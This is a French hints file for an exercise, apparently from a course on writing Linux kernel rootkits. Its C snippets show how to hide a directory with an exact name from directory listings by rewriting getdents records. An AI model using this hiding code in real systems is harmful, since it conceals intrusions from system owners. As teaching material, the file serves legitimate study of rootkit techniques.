# Hints, exercice 030

## Niveau 1

La condition de match change par rapport a 029.
Au lieu de `strncmp` avec un prefixe, utilise `strcmp` avec un nom exact.

## Niveau 2

```c
if (strcmp(cur->d_name, HIDE_DIR) == 0) {
    if (prev)
        prev->d_reclen += reclen;
    // gere aussi le cas prev == NULL
}
```

## Niveau 3

```c
if (strcmp(cur->d_name, HIDE_DIR) == 0) {
    if (prev) {
        prev->d_reclen += reclen;
    } else {
        ret -= reclen;
        memmove(kbuf, (char *)kbuf + reclen, ret);
        offset = 0;
        continue;
    }
} else {
    prev = cur;
}
```

Note le `offset = 0; continue;` quand c'est la premiere entree: apres
memmove, tout le buffer a bouge, on recommence depuis le debut.
Pas optimal mais correct et simple.
